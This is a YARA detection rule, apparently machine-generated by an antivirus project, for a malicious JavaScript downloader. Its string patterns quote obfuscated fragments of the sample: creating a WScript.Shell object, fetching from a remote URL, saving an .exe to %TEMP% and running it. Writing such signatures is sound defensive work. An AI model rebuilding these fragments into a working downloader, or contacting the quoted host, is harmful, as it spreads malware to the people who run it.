rule sig_20160328_bd36cf61374e3d806d93af434554bf82 {
  meta:
    description = "datamaliciousorder - file 20160328_bd36cf61374e3d806d93af434554bf82.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "aa9c6ce2d0a2d24886fccd5b741acc46c40a6416cfd9d9f396a78da647da0231"

  strings:
    $s1  = "function Khiok() {return Ibmvdwkjrm[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"WXqzEq5FC7.exe\";};" fullword ascii
    $s2  = "Xfxxghtz[Lqzaw](\"GET\", \"http://portal.ofar.com.br/o4psaf\", false);" fullword ascii
    $s3  = "do {WScript[Eghslsxcmm](Uocmfq() * 11)} while (Xfxxghtz[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Nopaev(Dcxbfdqflm, Iavckc){return Dcxbfdqflm - Iavckc;};" fullword ascii
    $s5  = "var Ibmvdwkjrm = function Lalqxbemx() {return WScript[Ahtmldx](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Pyoajl() {return ((Ryjlrmqck == true) && (Ryjlrmqck == Vxbgtxnod)) ? 1 : Adcqxsbxz;};" fullword ascii
    $s7  = "function Ackffh(Lccjn){Ibmvdwkjrm[\"Run\"](Lccjn, Adcqxsbxz, Adcqxsbxz);};" fullword ascii
    $s8  = "function Xyjcckvsb(){return Vceqwuhc;};" fullword ascii
    $s9  = "function Xbftencmuy(Rgpjzlwn) {var Kcwuqpgi = (1, 2, 3, 4, 5, Rgpjzlwn); return Kcwuqpgi;};" fullword ascii
    $s10 = "var Ddmnrbkqi = false;" fullword ascii
    $s11 = "function Itfetskbb(){return Ahtmldx;};" fullword ascii
    $s12 = " while (Kptjkz){" fullword ascii
    $s13 = "return Nopaev(Euppt, Rzqjnw);" fullword ascii
    $s14 = "function Uocmfq(){return 22;};" fullword ascii
    $s15 = "var Vxbgtxnod = false;" fullword ascii
    $s16 = "Ryjlrmqck = true; " fullword ascii
    $s17 = "var Ryjlrmqck = false;" fullword ascii
    $s18 = "function Mxmell()" fullword ascii
    $s19 = "Vxbgtxnod = true; " fullword ascii
    $s20 = "var Mmuqwxwuxy = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}